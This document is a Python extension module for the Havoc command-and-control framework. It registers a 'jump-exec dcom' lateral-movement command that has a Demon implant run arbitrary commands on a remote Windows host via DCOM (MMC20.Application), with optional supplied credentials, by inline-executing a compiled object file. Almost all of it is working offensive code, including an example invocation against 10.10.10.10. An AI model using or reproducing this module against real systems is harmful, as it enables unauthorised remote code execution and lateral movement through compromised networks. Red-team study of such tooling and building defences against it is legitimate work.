from havoc import Demon, RegisterCommand, RegisterModule


def dcom_exec( demonID, *params ):
    TaskID : str   = None
    demon  : Demon = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)

    target     = ''
    username   = ''
    password   = ''
    domain     = ''
    command    = ''
    is_current = True

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    target  = params[ 0 ]
    command = params[ 1 ]

    if num_params > 2 and num_params < 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters (need username, password, and domain together)" )
        return False

    if num_params == 5:
        is_current = False
        username = params[ 2 ]
        password = params[ 3 ]
        domain   = params[ 4 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(command)
    packer.addbool(is_current)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run command on {target} via DCOM (MMC20.Application)" )

    demon.InlineExecute( TaskID, "go", f"bin/dcom.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", "" )
RegisterCommand(
    dcom_exec,
    "jump-exec",
    "dcom",
    "Execute a command on a remote host via DCOM (MMC20.Application)",
    0,
    "target command <otp:username> <otp:password> <otp:domain>",
    "10.10.10.10 \"cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt\""
)
